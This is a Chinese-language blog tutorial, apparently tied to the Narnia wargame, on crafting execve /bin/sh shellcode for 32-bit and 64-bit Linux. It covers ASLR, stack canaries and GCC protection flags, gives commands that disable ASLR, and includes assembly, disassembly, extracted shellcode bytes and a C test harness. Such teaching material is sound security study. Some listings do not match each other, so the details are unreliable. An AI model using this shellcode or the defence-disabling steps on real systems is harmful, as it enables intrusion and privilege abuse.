---
layout: post
title: Demystifying the Exceve Shellcode(Stack Method) on 32-bit & 64-bit platform
tags: [ShellCode, Disassembly]
header-img: img/post-hacker.jpg
catalog: true
---

### Prologue

ShellCode - Execve 有多种实现方法，其中“最受欢迎”的为使用**栈**和`JMP-CALL-POP`。主要思路为通过程序的缓冲区溢出漏洞覆盖返回地址，从而将程序的执行流转向启动`\bin\sh`的字节码。

#### The do's and don'ts

* 可执行二进制文件的拥有者是否设置了`suid`位;   [suid more info](http://www.linuxnix.com/suid-set-suid-linuxunix/) 
* `randomize_va_space`文件是否关闭了`VSLR`；
* 编译参数中是否关闭了可行性栈(`-z exevstack`)、栈保护(`-fno-stack-protector`)以及编译成的可执行二进制程序是32位(`-m 32`)还是64位；
* `execve system call number`，在使用汇编调用`execve`系统调用时需要；

#### Execve System call number & -m32参数

64位平台的系统调用号保存在`/usr/include/x86_64-linux-gnu/asm`目录下的`unistd_32.h`和`unistd_64.h`文件。32位平台需将路径中的`x86_64-linux-gun`换成`i386-linux-gun`;

```c++
// unistd32.h
#define __NR_execve 11
// unistd64.h
#define __NR_execve 59
```

Document: [LINUX SYSTEM CALL TABLE FOR X86 64](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) 

`-m 32`参数可以通过`file`命令查看可执行二进制文件的信息获得，如：

```sh
/narnia$ file narnia2
narnia2: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=8519cde12087a5ccc770fa731bf243590f83f19d, not stripped
/narnia$ uname -a
Linux narnia 4.4.0-91-generic #114-Ubuntu SMP Tue Aug 8 11:56:56 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

#### execve function

```sh
$ man execve
SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);      
       argv is an array of argument strings passed to the new program.   By  conven-
       tion,  the first of these strings should contain the filename associated with
       the file being executed.
```

filename指向可执行二进制文件`/bin/sh`的字符串地址，且`argv`提示第一个字符串需要是`filename`...OK，将`char *filename`指向`argv[0]`即可；

### Stack Protection mechanism

#### ASLR(Address Space  layout Randomization)

地址随机化([ASLR·Wikipedia](https://en.wikipedia.org/wiki/Address_space_layout_randomization))是一种能有效防御缓冲区溢出攻击的工具，基于缓冲区溢出的漏洞攻击必须事先了解缓冲区的起始地址，以便构造出合适的数据覆盖相应的栈空间。在**早先**的系统（含32位系统之前的）中，每个程序的栈位置是**固定**的，只要操作系统、编译器版本和参数相同，在不同的机器上生成和运行同一个程序的**栈**的位置就完全相同，这样程序中函数的**栈帧**首地址非常容易确定（栈帧`EBP`是在之前的IA32指令集中的概念，x86-64指令集使用寄存器传递参数之后，不再有栈帧指针的概念了）。这样如果攻击者确定了一个有漏洞的常用程序所使用的栈地址空间，就能在很多机器上实施攻击。

地址随机化在加载程序时生成的**代码段**、**静态数据段**、**堆段**、**动态库**和**栈区各部分**的首地址进行**随机化**处理，即起始地址在一定范围内随机化，使得每次启动加载到不同的起始地址。

```sh
# disable ASLR
$ echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space
# enable ASLR
$ echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space
```

即使用`dd`命令将`2`覆盖原文件；一般在漏洞平台对于该`randomize_va_space`有`r`权限，但是当前用户没有加入到`sudo`组中，即无法修改该文件对源代码重新进行编译…

#### GCC堆栈保护技术

##### Canaries探测

Canaries探测通过在缓冲区和控制信息(如`EBP`前)间插入一个canary word来检测函数栈是否被破坏，由于在返回地址被覆盖前，canary word会首先被覆盖。常用的几种canary word有：

* Terminator canaries: 由于绝大多数溢出漏洞都是由C语言字符串处理函数引起，所字符串以`NULL`作为结束字符，所以可选用`NULL`、`CR`、`LF`等字符作为canary word。如，当使用`0x000aff0d`作为canary word，当传入的字符串中含有`0x00`即`NULL`会使`strcpy()`截断字符串，`0x0a`会使gets()`结束读取传入的字符串。
* Random canaries: 随机产生的canaries保存于一个未被**映射**到的虚拟地址空间的内存页中，通常攻击者无法读取该值。这样当攻击者试图通过指针访问该随机值时，通常由于权限或地址异常而出现segment fault。但攻击者仍然有可能直接访问保存在**函数栈**中的随机值的**副本**..
* Random XOR canaries：`XOR`就相当于一个**校验和**，即将随机数和函数栈中的所有**控制信息**、返回地址通过异或运算得到。

##### GCC栈帧保护

GCC 4.1版本中，引入了Stack-smashing Protection(SSP，又称为ProPolice)堆栈保护机制，其中SSP不仅保护了返回地址、栈帧地址，还将**局部变量**的数组放在栈地址的高位，将其他类型的变量至于栈地址的低位。这样通过数组溢出来修改其他变量的值变得更为困难。

##### GCC中与堆栈保护有关的编译选项

* `-fstack-protector`:启用堆栈保护，不过只为函数中含有`char数组的函数插入保护代码；
* `-fstack-protector-all`: 为所有函数插入保护代码；
* `-fno-stack-protector`：**禁用**堆栈保护；

详见：[GCC中的编译器堆栈保护技术](https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/) 

#### 限制可执行栈代码区域

GCC编译参数中的`-z excestack`指明栈的非代码段区域也可以执行程序，GCC默认将程序的**数据段**地址空间设置为不可执行，而只有代码段的访问属性是可执行的，其他区域的访问属性为可读或可读可写。

### Crafting Shellcode on 32-bit executable binary file

```assembly
; create shellcode.nasm
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f6e  ;Pushing /sh
push    0x69622f2f  ;Pushing //bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
```

注：在`Unix-like`平台，路径中包含**连续**多个`/`并无影响。这样由于栈地址对齐的原因，可以将`/bin/sh`改为`/bin//sh`或`//bin/sh`。同时上面是以`little-endian`模式入栈的，**系统调用号**存放在`eax`中。

最后栈中数据存放、指针位置如图：

![Screen Shot 2013-04-05 at 5.19.18 PM](http://otoxza4eu.bkt.clouddn.com/blog/082030.png)

使用`nasm`命令编译汇编代码：`nasm -f elf shellcode.asm`，其中`-f elf`默认生成`elf32`格式，输出的目标文件后缀为`.o`，与c语言默认输出的`a.out`不同:-)

```assembly
$ objdump -d -M intel shellcode.o
shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <.text>:
   0:	31 c0                	xor    eax,eax
   2:	50                   	push   eax
   3:	68 2f 2f 73 68       	push   0x68732f2f
   8:	68 2f 62 69 6e       	push   0x6e69622f
   d:	89 e3                	mov    ebx,esp
   f:	50                   	push   eax
  10:	89 e2                	mov    edx,esp
  12:	53                   	push   ebx
  13:	89 e1                	mov    ecx,esp
  15:	b0 0b                	mov    al,0xb
  17:	cd 80                	int    0x80
```

这样就可以**提取**出Shellcode**字节码**: 

```sh
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

#### 使用C语言测试ShellCode

```c++
// create shellcode.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
	return 0;
}
```

```sh
narnia2@narnia:/tmp$ gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
narnia2@narnia:/tmp$ ./shellcode
Shellcode Length:  25
$ whoami
narnia2
$ exit
narnia2@narnia:/tmp$
```

### Crafting Shellcode on 64-bit executable binary file

64位可执行文件的ShellCode注入原理和思路与32位一致，只不过64位系统使用寄存器传递参数（参数个数不超过6个），依次为`rdi`,`rsi`,`rdx`,`rax`,`r8`,`r9`;同时系统调用变成了59；

```assembly
; Create shellcode.asm
global _start
_start:
; Clearing rdi, rsi, rdx, rax registers
xor rdi, rdi	
xor rsi, rsi
xor rdx, rdx
xor rax, rax
push rax
; 68 73 2f 6e 69 62 2f 2f  -> /bin//sh
mov rbx, 68732f6e69622f2fH
push rbx
mov rdi, rsp
mov al, 59
syscall
```

其中`rdi`存放的是第一个参数`char *filename`，即`/bin/sh`的地址，系统调用号存放在`rax`中，第二、三个参数为空，显然这64位系统函数调用参数传递代价更小。

`nasm -f elf64 shellcode.asm`生成可重定位目标文件：`shellcode.o`，使用`ld`链接器进行链接：`ld -o shellcode shellcode.o`，并运行可执行目标代码文件。

使用objdump反汇编shellcode.o可重定位文件：

```sh
test@ubuntu:~$ nasm -f elf64 shellcode.asm
test@ubuntu:~$ ld -o shellcode shellcode.o
test@ubuntu:~$ ./shellcode
$ whoami
test
$ exit
test@ubuntu:~$ objdump -d -M intel shellcode.o
shellcode.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <_start>:
   0:	48 31 ff             	xor    rdi,rdi
   3:	48 31 f6             	xor    rsi,rsi
   6:	48 31 d2             	xor    rdx,rdx
   9:	48 31 c0             	xor    rax,rax
   c:	50                   	push   rax
   d:	48 bb 2f 2f 62 69 6e 	movabs rbx,0x68732f6e69622f2f
  14:	2f 73 68 
  17:	53                   	push   rbx
  18:	48 89 e7             	mov    rdi,rsp
  1b:	b0 3b                	mov    al,0x3b
  1d:	0f 05                	syscall 
```

这样就获得了**31**字节长的Shellcode-Exceve字节码为：

```sh
\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05
```

### 参考资料

* [Demystifying the Execve Shellcode (Stack Method)](http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html)
* [Shellcode Injection](https://dhavalkapil.com/blogs/Shellcode-Injection/)
* [Linux/x86-64 - execve /bin/sh Shellcode (31 bytes)](https://www.exploit-db.com/exploits/41883/)
* [Making system calls from Assembly in Mac OS X](https://filippo.io/making-system-calls-from-assembly-in-mac-os-x/)
* 计算机系统基础·袁春风 第三章 程序的转换与机器级表示


